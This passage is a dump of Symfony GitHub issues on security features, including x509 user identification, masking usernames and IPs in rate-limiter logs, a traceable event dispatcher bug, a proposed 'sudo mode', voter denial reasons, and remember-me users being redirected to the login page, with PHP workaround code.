 > Subject: C = FR, O =My Organization, CN = user1, emailAddress = user1@myorg.fr

In some case, we do not identify user by their email address and prefer use the `CN` (Common Name) as identifier, because our users do not have email, or the x509 Client Certificate do not contains email (eg: in case of Caddy server, the emailAddress is not part of the TLS Subject).

Is it better to add a parameter to defined the **subject field** (eg: CN or emailAddress) we want ? But it can cause trouble in case of Apache, because the `userKey` (aka: field extract from tls subject) parameter contains the `SSL_CLIENT_S_DN_Email` fastcgi env (Apache only).

In the case of Caddy or Nginx, the HTTP server only return the `SSL_CLIENT_S_DN` fastcgi env (do not split the string and extract CN or emailAddress), and the Authenticator try to extract it from the `credentialsKey` parameter (aka tls subject).

Actual x509 config:
 - **userKey**: default on `SSL_CLIENT_S_DN_Email` (Apache) => Email part from the TLS Subject
 - **credentialsKey**: default on `SSL_CLIENT_S_DN` (All HTTP server) => TLS Subject

### Example

_No response_",,no,"Security,Feature,"
symfony/symfony,1237014064,"[Security][Throttling] Hide username and client ip in logs","### Description

When using the login throttling feature, username and IP may appear in the debug logs (e.g. when an error occurs in prod with fingers_crossed logger):

```
Successfully acquired the ""username_ip_login-random.username-1.2.3.4"" lock.
Expiration defined for ""username_ip_login-random.username-1.2.3.4"" lock for ""300"" seconds.
```

What do you think about (optionally) masking these information? For example by adding a `MaskingLoginRateLimiter` in addition to the `DefaultLoginRateLimiter`. A straight forward approach would be to use a hash of username and client ip as the key for the limiter(s).

This would not only mask the log messages but would impact all appearances of the keys, e.g. in storage. This might be an advantage or a disadvantage. Although, at least the PdoStore hashes the key anyway. The Lock class, where the logs originate, seems to be the wrong place for tweaking, as it's (and should not be) aware of the content of the key.

Another approach, probably on application level, would be a monolog processor, which replaces the username and client ip, but this seems less efficient and not that robust.

### Example

```php
protected function getLimiters(Request $request): array
{
    $username = $request->attributes->get(Security::LAST_USERNAME, '');

    $globalKey = hash('sha256', $request->getClientIp());
    $localKey = hash('sha256', $username.'-'.$request->getClientIp());

    return [
        $this->globalFactory->create($globalKey),
        $this->localFactory->create($localKey),
    ];
}
```","Maybe we can add `hashKeys` option in construct of `DefaultLoginRateLimiter` default false and allow to define it in configuration",no,"Security,"
symfony/symfony,992914384,"[Firewall dispatcher] Traceable Event Dispatcher ","**Symfony version(s) affected**: 5.3.7

**Description**
I was using in the past the general TraceableEventDispatcher in debug mode to track my user actions during dev.
It is not fully possible anymore since version 5.3.7.
The security dispatcher is only a EventDispatcher class.

NB: Therefore, the profiler is pretending security events are not triggered

**How to reproduce**
```
<?php 

// SecuritySubscriber.php
namespace xKzl\MyBundle\Subscriber;

use Symfony\Component\EventDispatcher\EventSubscriberInterface;

use Symfony\Component\DependencyInjection\Argument\ServiceLocator;
use Symfony\Component\EventDispatcher\Debug\TraceableEventDispatcher;

class SecuritySubscriber implements EventSubscriberInterface
{
    /**
     * @var array[TraceableEventDispatcher]
     */
    private $dispatchers = [];

    public function __construct(
        ServiceLocator $dispatcherLocator) {

        $this->dispatcherLocator = $dispatcherLocator;
        foreach($this->dispatcherLocator->getProvidedServices() as $dispatcherId => $_) {

            $dispatcher = $this->dispatcherLocator->get($dispatcherId);
            if (!$dispatcher instanceof TraceableEventDispatcher) continue;

            $dispatchers[] = $this->dispatcherLocator->get($dispatcherId);
        }

        dump($dispatchers);
    }

    public static function getSubscribedEvents()
    {
        return [];
    }
}
```

I declared my subscriber as following:
```
        <service id=""xKzl\MyBundle\Subscriber\SecuritySubscriber"">
            <tag name=""kernel.event_subscriber"" />
            <argument type=""tagged_locator"" tag=""event_dispatcher.dispatcher"" index-by=""name""/>
        </service>
```","Any feedback ?Do you mean that when the debug mode is enabled the event dispatcher used by the firewall is not decorated by the `TraceableEventDispatcher` class? If so, would you like to try finding out which commit changes that?I am going to close here for now due to the lack of feedback. Please let us know when you have more information and we can consider to reopen.Dear @xabbuh,

Sorry for my late reply. I couldn't spent time on that before. 
I can confirm the issue is persisting in 5.3.9.

Following up with you previous comment, I don't think we can really find a commit for this issue.
The point is that the ""main"" dispatcher has been split into two parts, while before there was only one dispatcher..
So I can still go back to a previous version, but the problematic dispatcher (that is not decorated) would not exist yet.

I am in the process to find where the service is decorated, but this is quite new to me.. So I am not sure I will trace back this issue quickly. Please find attached the result of dumping the `$dispatcher = $this->dispatcherLocator->get($dispatcherId);` variable running SF 5.3.9
```
SecuritySubscriber.php on line 96:
Symfony\Component\HttpKernel\Debug\TraceableEventDispatcher {#117 ▼
  #logger: Symfony\Bridge\Monolog\Logger {#110 …6}
  #stopwatch: Symfony\Component\Stopwatch\Stopwatch {#266 ▶}
  -callStack: SplObjectStorage {#1010 ▶}
  -dispatcher: Symfony\Component\EventDispatcher\EventDispatcher {#105 …3}
  -wrappedListeners: []
  -orphanedEvents: []
  -requestStack: Symfony\Component\HttpFoundation\RequestStack {#298 ▶}
  -currentRequestHash: ""0000000029e59e16000000003be70944""
}
SecuritySubscriber.php on line 96:
Symfony\Component\EventDispatcher\EventDispatcher {#66 ▼
  -listeners: array:7 [▼
    ""Symfony\Component\Security\Http\Event\CheckPassportEvent"" => array:5 [▶]
    ""Symfony\Component\Security\Http\Event\LoginSuccessEvent"" => array:4 [▶]
    ""Symfony\Component\Security\Http\Event\LogoutEvent"" => array:2 [▶]
    ""Symfony\Component\Security\Http\Event\AuthenticationTokenCreatedEvent"" => array:1 [▶]
    ""Symfony\Component\Security\Http\Event\LoginFailureEvent"" => array:1 [▶]
    ""Symfony\Component\Security\Http\Event\TokenDeauthenticatedEvent"" => array:1 [▶]
    ""security.authentication.success"" => array:3 [▶]
  ]
  -sorted: []
  -optimized: []
```I just found the origin of the security event dispatcher for my ""main"" firewall :
`./vendor/symfony/security-bundle/DependencyInjection/SecurityExtension.php(392)`
Printing the `$this->dispatcherLocator`, I can observe that serviceTypes if somehow casting the security dispatcher to be `Symfony\Component\EventDispatcher\EventDispatcher` :
```
SecuritySubscriber.php on line 93:
Symfony\Component\DependencyInjection\Argument\ServiceLocator {#408 ▼
  -factory: Symfony\Component\DependencyInjection\Container::getService($registry, string $id, ?string $method, $load) {#97 ▶}
  -serviceMap: array:2 [▼
    ""event_dispatcher"" => array:4 [▼
      0 => ""services""
      1 => ""event_dispatcher""
      2 => ""getEventDispatcherService""
      3 => false
    ]
    ""security.event_dispatcher.main"" => array:4 [▼
      0 => ""privates""
      1 => ""security.event_dispatcher.main""
      2 => ""getSecurity_EventDispatcher_MainService""
      3 => false
    ]
  ]
  -serviceTypes: array:2 [▼
    ""event_dispatcher"" => ""?""
    ""security.event_dispatcher.main"" => ""Symfony\Component\EventDispatcher\EventDispatcher""
  ]
  -externalId: null
  -container: null
  -factories: array:2 [▶]
  -loading: []
  -providedTypes: null
}```I could eventually find that the dispatcher is called in `vendor/symfony/security-bundle/DependencyInjection/Compiler/RegisterGlobalSecurityEventListenersPass.php`, but 
```
 $firewallDispatchers[] = $container->findDefinition('security.event_dispatcher.'.$firewallName);
```

This guy is already returning an EventDispatcher instead of a TraceableEventDispatcher, but therefore not tracing the called listener..@xKZL Are you wiling to send a PR fixing this?Yes, but I am lacking knowledges about internal Symfony architecture.. if I can find where the global event dispatcher gets decorated and where is called the security one I could surely do something.Got it, event listeners registered on core security events are not traceable anymore. 
To reproduce, register an event listener on e.g. `security.interactive_login`. With authenticator manager disabled, the listener is listed in the `Called listeners` profiler panel but with authenticator manager enabled, it is part of `Non called listeners` although it's actually called.

This qualifies as a bug to me. Any event dispatcher (`event_dispatcher.dispatcher` tagged service) should be decorated as traceable IMHO, but currently only the main `event_dispatcher` service is decorated. The EventDataCollector should then be updated to collect listeners from all those dispatchers instead.
I'll send a PR.@chalasr Thank you so much for confirming the bug and your investigation.
I am very interested in understanding how you will fix this in your PR.
I will surely look at it :)For the record, I started working on a patch for this. The tricky part is that the per-firewall dispatcher services are created at a stage where we cannot use decoration (runs after DecoratorPass), I need to figure out how to make them traceable. 
I will be back on it asap.",no,"Security,Bug,Status: Reviewed,Keep open,"
symfony/symfony,505874468,"[Security] Add ""sudo mode""","**Description**  
""Sudo mode"" is a security feature which allows web applications to ask users to reenter their passwords before performing some critical task (unless they have reentered it ""recently"").

I asked around in the Symfony Slack and some people said that it'd be great to add this to Symfony core ... but others disagree arguing that it's trivial to implement it yourself. So, let's discuss about this feature. Thanks!

**Example**  
GitHub for example uses it:

![image](https://user-images.githubusercontent.com/73419/66657702-8da56680-ec40-11e9-87f7-6b7493c543e1.png)
","The reason I would like this is that it would make it more likely that it would be used 'by default' within apps, and it would raise the overall level of security likely to be implemented within apps based on Symfony. I would certainly use it, and while I have considered implementing it myself, I am nervous of doing things related to security without doing proper due-diligence on them, so I've never yet found the time.

Having a peer-reviewed implementation of this would make me much more likely to use it.

The way I imagine it working could be having another AUTHENTICATED_ status (like `AUTHENTICATED_RECENTLY`) which could be checked in the same way that you might check `AUTHENTICATED_REMEMBERED` or similar at the moment.

Thanks for recommending this :+1: @patrickvale has summed up my opinions as well as I could.To me, a ""sudo mode"" is mostly an enhancement of the current ""remember me"" authentication system. This means that we could create a token with an expiration date, such as `ExpirableTokenInterface`, then, we could use `$authorizationChecker->isGranted()` with a special `AUTHENTICATED_RECENTLY` security attribute (like @patrickvale's idea) would check the token type. If token implements the `ExpirableTokenInterface`, access is granted if the expiration date is not reached, and denied if date is reached.The way I do something like that is by having some pages requiring `IS_AUTHENTICATED_FULLY` while most of my app allows `IS_AUTHENTICATED_REMEMBERED`.
I don't think we need a separate `AUTHENTICATED_RECENTLY` attribute unless your PHP session lifetime is so long that you could be fully authenticated for too long to be considered recent.@stof There's also something: if somebody logs in using the password remembered by the web browser, they may not know the actual password, so I think a `IS_AUTHENTICATED_FULLY` authentication is not enough: we need a 2nd ""stronger"" authentication to make sure the password is truly known. We could even imagine such 2nd authentication to be different: using captcha, use 2factor auth...
@Pierstoval that's a good point - the ability to 'easily' add 2FA (eg SMS) would be very interesting for some use cases.@quentinus95 mentioned in the 2FA issue an idea of ""identity trust level"" that can replace remember me, 2FA and sudo mode: https://github.com/symfony/symfony/issues/28868#issuecomment-536877013

I think that any modern version of the Security component (which we should achieve in Symfony 5) has to contain sudo mode and 2FA. Remember me in the current component is very complex and stopping most changes in the component. So I would be very happy if we can continue thinking about this ""identity trust level"" and transfer it into a workable issue to see if it works (and if it has any downsides).@wouterj as we already reached the feature freeze schedule, a rework of the whole security component won't make it in the 5.0 release.@Pierstoval sudo mode is not about having a second factor.
If you use a password manager for your github password, that still work for their sudo mode even though *you* don't know your password (only the password manager does). sudo mode is only about asking to authenticate at higher trust than a remember-me cookie.> @wouterj as we already reached the feature freeze schedule, a rework of the whole security component won't make it in the 5.0 release.

I know. When I talk about Symfony 5, I mean the 5.x lifecycle.Also, some operations are so sensitive that the sudo mode should not stand for ""recently"", but rather for that one time event only.

For example, when sending money from my banking app, I have to use 2FA to confirm the payment. Then, when I submit another payment, I have to use 2FA again for the second payment no matter how long ago was the first payment.

This feature (both ""one-time"" and ""recently"") should be available in core because it is so easy to implement it wrong and potential damage is too great.Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?I re-read this only the other day and I think, yes, it would be very useful. It's a very standard thing to verify that the person *requesting a specific action* is the real key holder, irrespective of how recently they logged in.Oh yes, this is still relevant (there are concrete plans to integrate this in 5.3). I've added the Keep Open label, to make sure it will not get auto closed.Are there any news on this?Are there any news on this?I don't know, do you have any news?I think there are no questions about ""do we want it?"". It's more like, ""who wants to work on it?"" As you know, features do not happen magically, and we need more volunteers to help. The core team is here to help if you have any questions about the implementation or anything else.
In the past, I've outlined some broad implementation ideas in https://github.com/symfony/symfony/issues/39308 (under ""At some knowledge of authentication factors (sudo mode)"")",no,"Security,Feature,RFC,Keep open,"
symfony/symfony,342667143,"[Security][DX] Be able to know why exactly SecurityVoter returns false","Sometimes I find it hard to debug why `is_granted` returns `true`/`false` in some cases. I know there is at least one feature request (#26343) that tries to improve this, but #24501 inspired me to create this feature request.

[This](https://symfony.com/doc/current/security/voters.html) code:

    // src/Security/PostVoter.php
    if (! $user->hasRole('ROLE_ADMIN')) {
        return false;
    }

    // src/Controller/PostController.php
    $this->denyAccessUnlessGranted('view', $post);

Reminds me of this:
![Computer says no](https://media.giphy.com/media/Jf8tQksLHhpXa/giphy.gif)


It would be great to re-use the idea behind `TransitionBlocker` when using [Voters](https://symfony.com/doc/current/security/voters.html). Instead, one should be able to write something like

    if (! $user->hasRole('ROLE_ADMIN')) {
        yield new VoterBlocker('You need admin rights to do this');
    }

This has two benefits:
* This will make it easier to debug because the reason can be shown in the Profiler. This will extend the [Detailed security voters decisions in Symfony 4.2](https://symfony.com/blog/new-in-symfony-4-2-detailed-security-voters-decisions)
* There could be a way to use this message to inform the user why it can't perform an action. Using `is_granted` feels like implementing ""Computer says no"" instead of ""Sorry, you need to be an admin/this post is private/etc/"". This can work similar to [Transition Blockers](https://symfony.com/blog/new-in-symfony-4-1-workflow-improvements#added-transition-blockers) in Symfony's Workflow Component 4.1 and the recently added `workflow_transition_blockers` from [Symfony 4.3](https://symfony.com/blog/new-in-symfony-4-3-workflow-improvements#added-workflow-transition-blockers-twig-function).


","That's something similar as #21094 isnt it?Well, that one is pretty similar! The idea behind it seems the same:

> For example on of our project, we use voters but we liked to know which voter and why was against this action and report it through a response or any kind. This can be used also in the profiler for some debugging.

I strongly disagree with the comment ""(after all, this is effectively ""fancy logging"")"", since this feature **can** improve logging, but the primary goal is to use it to inform the end user of why it hasn't got access to a resource.

I've no strong opinion about the implementation (yet), but it would be great if these two components (Security and Workflow) have a consistent way of blocking an operation, whether this is a (workflow) transition or something else.Can be done like the workflow transition blocker?
https://symfony.com/blog/new-in-symfony-4-1-workflow-improvements#added-transition-blockers> Can be done like the workflow transition blocker?
> https://symfony.com/blog/new-in-symfony-4-1-workflow-improvements#added-transition-blockers

Yes, that's what I mean! In Symfony 4.3 there are even more features: [New in Symfony 4.3: Workflow improvements](https://symfony.com/blog/new-in-symfony-4-3-workflow-improvements#added-workflow-transition-blockers-twig-function). The recently added `workflow_transition_blockers()` Twig function could have a SecurityVoter equivalent: something like `security_voter_blockers()`, which returns the reason(s) a user can't access the page.@stephanvierkant do you want to work on this ?I'd like to, but I have no experience with working on the Symfony project, so I think that is a bridge too far.Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?Seeing the number of 👍 on this issue and the related https://github.com/symfony/symfony/pull/35592, this feature seem really wanted :)Anyone up to continue #35592 ?Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?Yes, this feature is still wanted.

PR https://github.com/symfony/symfony/pull/46493 continues work began in last PRs and is rebased on 6.2",no,"Security,Feature,DX,Keep open,"
symfony/symfony,109124079,"Redirect authenticated with RememberMeToken user to login form after access check in controller","I have custom voter for check access to admin of Company entity

``` php
public function mainAction(Request $request, $id)
{
    ....

    $this->denyAccessUnlessGranted('admin', $company);

    ....
}
```

If AccessDeniedException is thrown i get redirected to login page even if user is logged in (with RememberMeToken). Is this expected behaviour?
I want get 403 error page for authenticated user and redirect to login page for anonymous user. What is right way to do this? Throw AccessDeniedHttpException instead?

https://github.com/symfony/symfony/blob/2.8/src/Symfony/Component/Security/Http/Firewall/ExceptionListener.php#L122 this part of code check that user should be not ""anonymous"" and not ""remember me"". I am not sure why we need remember me check here?
","@wiistriker my guess is that both anonymous and rememberme are considered to require an additional login if permissions are missing, elevating their permission level.
@iltar In my case user doesnt have rights to admin $company even if he fill username and password again. After he fill form, he get proper 403 page. It's very strange behaviour.
Code which represent flow which i want

```
         if (!$this->isGranted('admin', $company)) {
            if (!$this->isGranted('IS_AUTHENTICATED_REMEMBERED')) {
                throw $this->createAccessDeniedException();
            } else {
                throw new \Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException('Access denied');
            }
        }
```

If user is logged in he get 403 error page and will be redirected to login form if user is anonymous.

Method $this->denyAccessUnlessGranted('admin', $company); become really useless
I've been getting frustrated with this too.

In Symfony/Component/Security/Http/Firewall/ExceptionListener.php it checks for fullyFledged and then begins the authentication process. The default AuthenticationTrustResolver will always return false if the user is only ""remembered"".

```
private function handleAccessDeniedException(GetResponseForExceptionEvent $event, AccessDeniedException $exception)
{
    $event->setException(new AccessDeniedHttpException($exception->getMessage(), $exception));

    $token = $this->tokenStorage->getToken();
    if (!$this->authenticationTrustResolver->isFullFledged($token)) {
        if (null !== $this->logger) {
            $this->logger->debug('Access denied, the user is not fully authenticated; redirecting to authentication entry point.', array('exception' => $exception));
        }

        try {
            $insufficientAuthenticationException = new InsufficientAuthenticationException('Full authentication is required to access this resource.', 0, $exception);
            $insufficientAuthenticationException->setToken($token);

            $event->setResponse($this->startAuthentication($event->getRequest(), $insufficientAuthenticationException));
        } catch (\Exception $e) {
            $event->setException($e);
        }

        return;
    }
```
> I've been getting frustrated with this too.

Same here. But don't know how to fix. How to decide when redirection is correct, and when not.
This strange behaviour is still up to date in Symfony4.
I used something like this instead : 
```
if (!$this->isGranted('ROLE_USER')) {
    return $this->json(['message' => 'Please sign up before'], 403);
}
```
or : 
```
if (!$this->isGranted('ROLE_USER')) {
    return new Response('Please sign up before', Response::HTTP_FORBIDDEN);
}
```Same for me here, I use Symfony 4.2. I even tried to handle the denyAccessException but it didn't work for me.<- new to Symfony

Stumbled across the same issue as OP. My solution was writing a custom ExceptionListener.

app/config/services.yaml:
`App\Security\CustomExceptionListener:
        tags:
            - { name: 'kernel.event_listener', event: 'kernel.exception', method: 'onKernelException', priority: 100 }`

app/src/security/CustomExceptionListener.php

    public $container;
    private $tokenStorage;

    public function __construct(ContainerInterface $container, TokenStorageInterface $tokenStorage)
    {
        $this->container = $container;
        $this->tokenStorage = $tokenStorage;
    }

    /**
     * Handles access denied exception if RememberMeToken is set
     */
    public function onKernelException(ExceptionEvent $event)
    {
        $exception = $event->getThrowable();
        do {
            if ($exception instanceof AccessDeniedException) {
                $this->handleAccessDeniedException($event, $exception);

                return;
            }
        } while (null !== $exception = $exception->getPrevious());
    }

    private function handleAccessDeniedException(ExceptionEvent $event, AccessDeniedException $exception)
    {
        $event->setThrowable(new AccessDeniedHttpException($exception->getMessage(), $exception));

        $authenticationTrustResolver = $this->container->get('security.authentication.trust_resolver');
        $token = $this->tokenStorage->getToken();
        if ($authenticationTrustResolver->isRememberMe($token) == true) {
            $event->stopPropagation();
        }
    }

If you don't want to inject the container, you can alias the AuthenticationTrustResolver and inject it into the class constructor.

app/config/services.yaml:
`Symfony\Component\Security\Core\Authentication\AuthenticationTrustResolverInterface: '@security.authentication.trust_resolver'`

This way, the 'isGranted' and 'denyAccessUnlessGranted' functionality is available again and does not redirect to the login page.

You can just create your own AuthenticationTrustResolver and decide yourself which are the conditions that are to be considered if a user isFullFledged or not, so the user will just get the access denied page instead of a redirect.

I do have the feeling that this feature assumes a lot of things about the workflows that people use. Maybe I didn't read or find the documentation for this, but we were throwing AccessDenied exceptions (or bundles that we use) for the purpose of showing an access denied page and be done with it (we upgraded from an older version of Symfony), but now the framework takes over this and redirects the user to a login page.

LaterEdit: I worked on way too old versions on Symfony up until recently. The documentation actually is quite clear on what you can do: https://symfony.com/doc/4.4/security/access_denied_handler.htmlThank you for this issue.
There has not been a lot of activity here for a while. Has this been resolved?Friendly ping? Should this still be open? I will close if I don't hear anything.I can't confirm. I had reported my issue 5 years ago and ended up resolving it by extending the AuthenticationTrustResolver and providing the desired functionality within my application code, essentially the solution that @daniel-iwaniec suggested. That particular application is no longer under active development so I'm unsure how newer versions of Symfony may have affected that solution.@aromer I can confirm, it's still an issue sadly.Thank you for this issue.
There has not been a lot of activity here for a while. Has this been resolved?Just a quick reminder to make a comment on this. If I don't hear anything I'll close this.-I see mostly problems in this issue, but no proposed solutions on how to ""fix"" this issue in Symfony.

The only way I can see this issue move forward and no longer get these stalled questions is if people proposed solutions, maybe even as a pull request.

Note that a rememberme cookie is considered to be a weak authentication mechanism. As such, it is not considered ""full fledged"". That logic still makes sense to me.I didn't work on the project that showed this behaviour for over a year (symfony 4.x), but I tried to replicate it in my current project (symfony 5.3).
The behaviour is still the same: If a user returns to the site with a remember-me cookie set and tries to access a page he/she is not authorized to view, instead of being redirected to the 403 page he/she is redirected to the login page.

@danieldenbraven is right: the solution can be found in the documentation
https://symfony.com/doc/current/security/access_denied_handler.html#customizing-all-access-denied-responses

Not setting a custom response and stopping event propagation in case of a remember-me token redirects to the desired 'Access denied' page. The exception is no longer 'overwritten' by a any further exceptions. (E.g. a 401 response with a redirect to the login page.)

```
namespace App\EventListener;

use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpKernel\Event\ExceptionEvent;
use Symfony\Component\HttpKernel\KernelEvents;
use Symfony\Component\Security\Core\Authentication\AuthenticationTrustResolver;
use Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorageInterface;
use Symfony\Component\Security\Core\Exception\AccessDeniedException;

class AccessDeniedListener implements EventSubscriberInterface
{
    private $tokenStorage;

    public function __construct(TokenStorageInterface $tokenStorage)
    {
        $this->tokenStorage = $tokenStorage;
    }

    public static function getSubscribedEvents(): array
    {
        return [
            // the priority must be greater than the Security HTTP
            // ExceptionListener, to make sure it's called before
            // the default exception listener
            KernelEvents::EXCEPTION => ['onKernelException', 2],
        ];
    }

    public function onKernelException(ExceptionEvent $event): void
    {
        $exception = $event->getThrowable();
        if (!$exception instanceof AccessDeniedException) {
            return;
        }

        // ... perform some action (e.g. logging)

        // optionally set the custom response
        //$event->setResponse(new Response(null, 403)); <-- *** no custom response! *** default behaviour: redirect to login page!

        // or stop propagation (prevents the next exception listeners from being called)
        $authenticationTrustResolver = new AuthenticationTrustResolver();
        $token = $this->tokenStorage->getToken();
        if ($authenticationTrustResolver->isRememberMe($token)) {
            $event->stopPropagation(); // <-- *** stop propagation *** if user is logged in via remember-me cookie => redirect to 'Access denied' page!
        }
    }
}
```

Whether this opens up any security issues I'm not sure... access to any other 'secured' pages the user ought to have access to (e.g. to a 'my profile' page) is granted as if he/she was authorized via a regular login.Same issue here on 5.3. There is solution using `@isGranted` for exemple but not solve the issue:
```
use Sensio\Bundle\FrameworkExtraBundle\Configuration\IsGranted;

**
 * @IsGranted(""admin"", subject=""company"", statusCode=403)
 */
public function mainAction(Request $request, Company $company)
{
    ....
}
```

In my case, I don't use `denyAccessUnlessGranted()` but:
```
if(!$this->isGranted('admin', $company)) {
    throw new \Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException('Access denied');
}
```

Thank you for this issue.
There has not been a lot of activity here for a while. Has this been resolved?Just a quick reminder to make a comment on this. If I don't hear anything I'll close this.This is still present and needs to be resolved.

Symfony assumes too much when changing an AccessDeniedException into an InsufficientAuthenticationException. There is no basis to do so. If the developer expects the user to be fully authenticated, they can query for IS_AUTHENTICATED_FULLY themselves.@wouterj in regards to your query for a solution, I would suggest the following:

- Remove the conversion into an `InsufficientAuthenticationException` in `handleAccessDeniedException`
- Instead create a `handleInsufficientAuthenticationException` that sets the startAuthentication response
- Add a `denyAccessUnlessAuthenticatedFullyFledged()` to the controller trait that checks for `isGranted(IS_AUTHENTICATED_FULLY)` and then throws `InsufficientAuthenticationException` if false.

That way developers have all the control they need and an example in the code if they wish to programmatically kick the user to the authentication start.@uncaught just for my understanding:
This would mean that a check for ```isGranted('ROLE_NAME')``` will evaluate to true regardless of whether the user logged in via form or remember_me token? (Provided the respective role is asigned to the user.) Only the explicit check for ```isGranted(IS_AUTHENTICATED_FULLY)``` will throw an exception and redirect to the login page (per default) if the user is authenticated via remember_me token?
If so, I believe this is the most elegant way to resolve this issue...Yes and no. `isGranted` should never throw anything, just return a bool.

The `isGranted('ROLE_NAME')` result should be deterministic to the user and not the authentication method. Authentication is not the same as authorization. Mixing these concepts got us into this problem.

If you think it cleaner, we could make `denyAccessUnlessGranted(IS_AUTHENTICATED_FULLY)` throw the exception. Then we won't need an additional method in the controller trait. But I'm unsure if that would be a good design pattern to behave differently for exactly one argument.

-----

An alternative very simple fix would be to explicitly check the roles before jumping to conclusions:

src/Symfony/Component/Security/Http/Firewall/ExceptionListener.php
```diff
private function handleAccessDeniedException(GetResponseForExceptionEvent $event, AccessDeniedException $exception)
    {
        $event->setThrowable(new AccessDeniedHttpException($exception->getMessage(), $exception));

        $token = $this->tokenStorage->getToken();
-       if (!$this->authenticationTrustResolver->isFullFledged($token)) {
+       if (in_array(IS_AUTHENTICATED_FULLY, $exception->getAttributes()) && !$this->authenticationTrustResolver->isFullFledged($token)) {
```@uncaught tyvm for your response! :)
To my (rather limited) understanding, your simple fix doesn't - as far as I can see, I'm not sure :) - address the issue, namely that a user authenticated with a _remember_me_ token always gets redirected to the login page whenever he/she tries to access protected pages, regardless of whether he/she would have access with a _full-fledged_ token. Due to this line which is only circumvented with a _full-fledged_ token:
```
$event->setResponse($this->startAuthentication($event->getRequest(), $insufficientAuthenticationException));
```
Which makes no sense to me: assuming the user tries to access a page he/she wouldn't have access to anyway isn't mitigated by a redirect to the login page (only to get a ""Access denied 403"" response immediately after logging in).

This minor change in src/Symfony/Component/Security/Http/Firewall/ExceptionListener.php has the desired effect:
```diff
- if (!$this->authenticationTrustResolver->isFullFledged($token)) {
+ if (!$this->authenticationTrustResolver->isFullFledged($token) && !$this->authenticationTrustResolver->isRememberMe($token)) {    
```
With a major drawback: the possibilty for a user to upgarde his/her token from _remember_me_ to _full-fledged_ is removed completely. To avoid this from happening, I wrote a custom AccessDeniedListener when I ran into this issue a few years back (Symfony 5.3.3):
```
public function onKernelException(ExceptionEvent $event): void
    {
        $exception = $event->getThrowable();
        if (!$exception instanceof AccessDeniedException) {
            return;
        }

        // stop propagation (prevents the next exception listeners from being called)
        $authenticationTrustResolver = new AuthenticationTrustResolver();
        $token = $this->tokenStorage->getToken();
        if ($authenticationTrustResolver->isRememberMe($token)) {
            // stop propagation if user is logged in via remember-me cookie => redirect to 'Access denied' page!
            $event->stopPropagation(); 
        }

        // else, default behaviour: redirect to login page!
    }
```
Since there are always 2 exceptions queued up when access is denied (the initial _AccessDeniedException_ and the _AccessDeniedHttpException_ from method _handleAuthenticationException_), stopping the event propagation forces the framework to only handle the first one i.e. the user gets to see the ""Access denied 403"" page and is not redirected, regardless of the whether full-fledged or remembered. An anonymous user still gets redirected to the login page.

TL;DR Though I may very well be wrong about what your simple fix does, I nethertheless prefer your initial proposal of essentially splitting the exception in two i.e. not converting one exception into another:
- a (regular) ```AccessDeniedHttpException``` that gets thrown when isGranted evaluates to false *without* the startAuthentication response unless the user is anonymous.
- a ```InsufficientAuthenticationException``` that is only thrown when the developer explicitly asks for isGranted('IS_AUTHENTICATED_FULLY') which would set the startAuthentication response in case of a remember_me token present or an anonymous user. This way one would be able to mitigate the fact that a _remember_me_ token is considered a weak protection, but it's the developers responsibility to make sure that sensitive data can only be accessed by full-fledged users.

> @wouterj : Note that a rememberme cookie is considered to be a weak authentication mechanism. As such, it is not considered ""full fledged"". That logic still makes sense to me.

Your initial proposal - though a little bit more 'verbous' and not a 'simple fix' - I'd consider to be very 'clean' and the best solution:

> That way developers have all the control they need and an example in the code if they wish to programmatically kick the user to the authentication start. Offering to get a full-fledged token before getting an error is a feature we have since Symfony 2.0, because it is totally possible for *any* voter to include a check on `IS_AUTHENTICATED_FULLY` as part of a more complex decision.@stof what is your point?

It's not an offer, it's a forced redirect to a 401 response (or login page). I find that very inconvenient when I already know that changing the authentication method will not change the end result.

__________

@chris-k-k let me explain what the simple fix would do:

```php
if (in_array(IS_AUTHENTICATED_FULLY, $exception->getAttributes()) && !$this->authenticationTrustResolver->isFullFledged($token)) {
```

This would mean, that *only* if you threw an `AccessDeniedException` and set the attributes to include `IS_AUTHENTICATED_FULLY`, you would be redirected to the login if you were not fully authenticated.

I found this very simple because `denyAccessUnlessGranted()` already fills these attributes.

So lets say you are logged in via remember me:
- `denyAccessUnlessGranted(['ROLE_X', IS_AUTHENTICATED_FULLY])` will redirect you to the login (or 401 resposne)
- `denyAccessUnlessGranted('ROLE_X')` will give you 403 response@uncaught ty for the explanation! :)
So your quick fix achieves the same thing as what I did a few years ago if the additional attribute 'IS_AUTHENTICATED_FULLY' is set: it prevents the forced redirect when authenticated via the _remember_me_ token. With your solution having the added benefit of making it optional instead of hard-coded, which is much more preferable...

I'd still prefer the separation of authorization and authentication from your initial proposal:
> The isGranted('ROLE_NAME') result should be deterministic to the user and not the authentication method. Authentication is not the same as authorization. Mixing these concepts got us into this problem.

This still applies, no? Given that 'ROLE_NAME' is the authorization (or 'IS_ALLOWED_TO_EDIT' or w/e) and 'IS_AUTHENTICATED_FULLY' would be the authentication.

```$this->isGranted(['ROLE_ADMIN', 'IS_AUTHENTICATED_FULLY']);```
or
```$this->denyAccessUnlessGranted(['ROLE_ADMIN', 'IS_AUTHENTICATED_FULLY']);```

EDIT: Just found out that the support for an array of attributes has been removed a long, long time ago ;) #33584
Internally, it's still an array due to backwards-compatibility issues, I believe.btw i am still using simple code:

```
if (!$this->isGranted('admin', $company)) {
            if (!$this->isGranted('IS_AUTHENTICATED_REMEMBERED')) {
                throw $this->createAccessDeniedException();
            } else {
                throw new \Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException('Access denied');
            }
        }
```Pretty inconvenient if this needs to be repeated in every controller.

After trying to implement @uncaught's solution (which unfortunately didn't work due to _isGranted()_ & _denyAccessUnlessGranted()_ not allowing an array of attributes), this is what I did to get the desired result (in an old project - Symfony 5.3.3):

```diff
// Symfony\Component\Security\Http\Firewall\ExceptionListener
- if (!$this->authenticationTrustResolver->isFullFledged($token)) { ... }
+ if (null === $this->tokenStorage->getToken() || in_array('IS_AUTHENTICATED_FULLY', $exception->getAttributes())) { ... }
```
